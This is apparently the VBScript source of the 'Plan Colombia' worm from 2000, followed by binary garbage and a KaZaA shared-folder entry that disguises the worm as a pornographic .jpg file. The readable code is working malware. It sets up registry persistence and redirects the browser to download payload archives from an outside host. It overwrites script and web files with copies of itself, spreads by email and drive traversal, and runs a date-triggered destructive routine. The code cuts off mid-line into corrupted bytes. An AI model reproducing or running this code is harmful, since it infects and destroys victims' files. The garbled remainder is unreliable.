rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogot� 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina Mar�a" from "Santa fe de Bogot�"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (�������	)��\�,����0	8�O|$1Q�W���Yj�_n x�x�7��` 8��P�'+tw|,w���,%����D6U�t���<�^��!�>>��f��$��W���5�]z��/+`�%������W2֝��o<MM7�:9"�9�a>��'��e ��ӭ���(u��������뒓�}�W��5їh�̰�/�G����Zכ�yٍ������ӟ�o��u��Ux�g�F�u�� 	�v�`Bs�;���vk�;�N����5�H�mgVzD�c�hE��#���skJ� 3RjK�[k�VU�36�_�~��j�O/��9�����y����(l�=�g�Y��I�D�W9�9�y�]?��WH3/o�;��l�ז����a����<�@�]_�s5s�F�+�@n�a�x���?��H���_�+�$ou���/_^�J6�?�c�E�賶�xi@f�J�S��Z�k/;j�+:���^<��@��u�ö���vO+q��L�T�-����{+�w�m�!"/DUX��Y�ӷ5�a'W��e��G��;QICe�֞���݀�$�0C�t �Id�a�-���q�u�`�ۋ�
w���W<1=�Y_���յS�(��H�8��U�:��Y%,���.Z��ܻ֟JO	_�!���<��?m�#0�Y��>�i}��� �_~e��3����-���2:�s����,n�@���~�k� �Tb�A�]?7�� ^�D�)�H�IX�Ȯ>�O�6]R .F �4��+����#��{��d$b�|ò�n���Y����I�� ������A��,��R~)���-�GK�f����߻d��&蔑�u��q܉9��4�_A��<N���jY�������8U��r�U�
:����������ۨXo��X� ����+�
�����B/���F��}�i��h�GF8��py0�K�0���F�j�W4r򻜻���{�$��Y?ݴ�?��[��?Hh���Lv@O��P���Z��_\����,5�k��)�k�QOy܄n��'Xw�B�B)!�}�ngo�k�Jf�ڒ��
 �O�WcG���~�a��B~'ત ĆVd����r~����_6����%�� o��$ � bH�\� �F��%$�n18�q�~kް�!�v��+��ɉRpq�5 �� 78����� ��hƆ�QKG�o�a�ay\�տg�?;`���ts�a�{/���A�����;&kJ���R�X9����7�����������_�ɫQ59�n�oَ��R�!o����#I�9wbr� `���9��c�( �.�b�HE��������iv�"��F�湡� �_�/��l�j���Xcn������p�@�3�b}f����U{�(M� �J�������{��F2��:u�j��%=��+����-�Rۿ:����N����b�8:�"��`�ZJ/����9 #-w���7��q�{P�|�.�i�M�� ù0Z����� 2~)�>I:
>��i�No�rH�Iƈ��k�.�����0*���A�� �0�[1
0JC����2���~'%�\��E�߉��f�g�ҥ��֬������=q����C#���T��m���g�a:�|媯��볪� �nJ+����gan�:������&2��B�W�v���&��p��v��X.�}_xP/�q8�V~?^� �z8w��; ruT׾[w3ހ���:��
��V�Wz/�I�W�a����d�W���8��``��G:�U>�����\0 `_H΄�Z������l ��&� }�x�����"(~��`}�wk�X�ޔ�����Զ�8"�`��> `��'� � _@!B�G��Ľ�K!�)tv���|j�x�#~ @ /�Ao�J���[/S�7_���@� vQ�$4 J ���L@kϕ�Ȁ� �l#^n���/�0|���X }��ꀟ��ΗR�x�Y`L�x |$�_�	 `���C	���+��9��n�|������K0'O�	 `�`Ao�	 `��z�:%66��N:�M)�~P ���|�@����
�� S��I���@P�`F�@@��N��kȀ��dq���H�� �@n�� �    �  �v;�
�'U�ۻx��#�Ks*
y�_����U�9b#<�����y���}I����z
y̱��]��vwo�Ny�}��:���9b�C���oᕪ���O��s�XP��o(e��>M�&vB�Ǔ����^W�V"�\re�z٬�[�|u5ޚ�U�pЕ��C�+���    \U��  ��   T�H�  j=�Y�@�����#Y�K��#[Ye'#�u��}A��G�J�-#��4�_Ӓѱ�:��m�D����Y���I_a =�|�b%Ҩ�����q/Hp'��Q]Yz����Vw\�3�N#	���0���6e�`����؍JC.����/�A0\��1�B�L �0	�X`'W=Kʪ0��1&��[���7 E94A�$E��|0����4^NĬ�3�C^40�����oF�����E+}�K<[J�D���)�8�PY�r{������ L�*�B���n�B�r��t�E��VR�9ja�>@⸇����MKŪ�R��˲��y�`�V�S��E�&����
�e�p*~����Cz��3`���o83 ��kwO�~/�LKf�.Ĕݍ��X�K�T#^w�mS�� �za��%��8*C���oEUy>�=Υ��%�'�x�J�w H��!�*IDQ <�YĎZ�RB�����Fj(|sp;�����O�@�lK��V8��d���@�� =�S�n>]M��%$�0*�S0�K+*z��"tu9-�X{G�U-��ꨨ%At'i��2� P��R�dơ�ɿ��H�j$8�j��Y4�(]QN��D��P�'x:�":F�fWED|�*�M�QαO/��M��r��)=��D�y���'偔0`�3>0h�I&���d!$#rO���y�"!Q .$X
��@V�	ltMB]�e� ���˼X��!e�7���j	��:��Ǐ'Yd_!��pG�4��(dɡ�$�����q0�Qd�(�P���id��A��j	��P�/���&l�e��0�~�)!��ƾJ
3�pI����2�iE��9���D�v;�01�D�j� ��O��k)��g��&�    �P��  ��;{]�o��9z>�w����>�y�g�f'�l�]��/'��0�1V�U�ko��׾�=2Ƽ�����k��8Hz�
�K��h�D&���-t��%�\i<��+�&rg���?�1mwM=�����N~��V���� �*�KSQ���銶�]2T�   ���  ��      b=�m�g���̔��ъx���P�s�
�H�)�kD�쎎�$
�+��*4I��y#�g8[J�RZ��ކ���ET�&�>
9�Q_h@�G���!~�{bV0�� ���C^HǍ-$��$��!���H@҇�Jx8�`�����V�@��
P$��.���JؔXj ��7(RS�<07���l���`��ͥjt�ƸElR�a�>�(�3J�h�y���U��Q��1/�6�FmI�&�B�$zN��4;j|�?kq4!��.hgt�j~���ͺh�5�UAt[mҸ��I�E�:��0{����M�q���;��>��'���p<�D��Ngo^�ҭ��
��Q��MD�i(?@\w�#��M��mi%�������J�-c�>X�l<�b�d�1���V�%�=9��@pJ�~��p�g���>���/.>�E5�m��u*�C��D��
�4���R���$����@|X�4�:n�n������ �y�|7#𤌣9͂�D���(g��t;�g �-$��Ypj:]&�ldM�	(4�EіU�-��iMtLN螭,�THH�� ;��'��W��LT]Y���X}�JX��Tf����[>�2ި�9*�RNqZ��
]�(�B�PS����g��V�:ޣ����|~2����U�`f偔�^PN"�(su���#���lE�R9��i��������`�F@7�����bnIJ�����ܫ/ �0j N�`ix��,0��M���ɴ��1�^$C$ E`H��n�~4N��.��D� 1-<"�h=����`����!��=*D�h4�Q3`0��h�`�x$�1ph�
E�N�� �$~ X�I��L�M!`	� ����'����`�&�@E�*Ii��H�9��ʉ ��Yc@U~   ��h�  ҃,~��{wn��j�PS�|����*���7�О7�y{z}�M�U	�^N���&�wW��5�zF*=���]K�;���k�xhj�?;�Y�^�k�]yO���T�hJ��r�X�h��{�3�RZ�����l>�>�q:�C䌬���XP� �WY���~?݄�"�ʸ=���   ���  ��   �S�   b>�@���r�s+6A̻úh����+��Q?`,vO<8�#!���� ���m�QY/6�}S�<�a��I�,~��}B(����  g�����P�3��7�`<7t��aC�!M.��v��C�+V�ɋ(���vDeWBBVm����!�y��K��0�J��N�E)��֢�j�r�Uj�(��U�!�x!�y4�"������ӓ{�7�t�>-'��s�W���Q&�@����CD�C��x4IFƢRqx�B��p���X��}�
t@�F������|�1+��S����IO�4� �Mt��,�;QI[@�4��c׀!���/8��:�'�ns4)Ρ�s\�<�` �"����O� ��M���i�5=l�S��</̺��� G�3��u'^�͔�e���D���ݺ<N���D���TVD��͢B�����$�pY |��7e'E�TZP�V���Q=�v��!���qӉ"=�}����^���V�n��D��|������T}�,�ͯ((�n�0랉kn���*'DԜ|`�(#<�8�	���^�c�˗���uo*��L9i��V�b��Ԕ�L���T8�sS�e1?�0
����$����q�6����QXD l�* !��)�Xl���m�cD��cC�P$�(tI@Ԭ�JZ�Jx ��> 4� ��iu�L!�`�P�Yd K�t���Ie�5g��KpQ� X>5��1�* vM�k�1�[ă0`f,�����,�|ɗ��F6�!�,���x*����РH�hN,bNJ�> ��dp�g�1*�^D��?���D0݀D��D�z!��ny���B�@��S!��.�k5��Dސ�<^N�
G�'��M+����y9� ]
�(x2��$�I�   \� �  �aK��XU�󷗪�����ְ�9�ަ�k��+Y��E�^wʮ��Tܓ��X®K��rN�ߕ�^�0���]m�W��%�*�6���W���Y�,�.Il3�ݟ*��;]���Ygx�dZ����wzY�B��{S.vP�݌�@� �$�X cE3�E��L>ΦXT   �/��  ��   ��Q   Z>�xux͵��GZFlyׇuQD?�/�;�0�Gz&�������\�Dx��0�tLz^���d�f�ڊ��| 5�m�QOb���WȞE���/ڡT�>͖��ʃ: zX$��/��Q�nV>�����w�fO��f/.�}�Ep�Ƣ��(�uW�����})�貓��OG��: ��H�Q56�%:�7�?����a0!���!��ށ�q���E�*��)*Pu�])�I���IC7ʓ��ر�8j7J �v��+}DUF3�����#��G����x%#¯.뢘�3�%#ļɺ&2N�WE$j蜝���=��̀�h<^�?��U�H� *�"�OH���� �$�YaU��)O�~"^w�;�(�)n.�������!T�����Z��+\#�"�%��`�ϼ����Y��`]ݺ��nԌ�:�"{aY������](�1
'@9WW���Q&�m�v���đ@x�X\���� r,1*N��� :�Cy!�
���{.�w���;��xD�` ¨�砿̆�ݒ���O�4����4\��3��p���QHt2n3�7O�U�X(��O�7�����M,���RTsEb�:B VG�KBNJ(���.�-�K��`�(���4��S�@9w1�LI����'!�{eCh�G�BH-&g�Ee�m������<Y�W�C���,	��M��C؁�>Ʀ覆�P�� ��W����5 8;R����Z�l��g'F�
�4١%�Qh|���3�@"=a0��X� ���%���;��UO[���e<,D{@�>H���Gq(��	Q��B��T��ٖm�����_�� � 8"}�@ /����kt�/A)�L]��TV�PGX��İߎ��ز�BMOf_�z�p������C`   /X�  �aJ�;�|�{z����qU0��4�?W���؋[Y�E��2,j;�ݟ��W�5��ܸ�����a�M������\���Os���>>�p�[X�y�nO5��>pvX2�Oî_[r�,W{�
�*��y\TL �@��w>u\'�>�P����3Jژ\�.�4�p�\�>   ]x��  ��         Digimon- Mimi & Palomon (porn).jpg.vbs  -  �� -�=#EE��B�t����/  ��1Ҿ  �5��  Impy_Kaizer@KaZaA   �� �   P   �����   @   ����   0   |   ��+=                         �� -�=#EE��B�t�����+=����    C:\Program\KaZaA\My Shared Folder\Digimon- Mimi & Palomon (porn).jpg.vbs               B      �/           KAZAU6���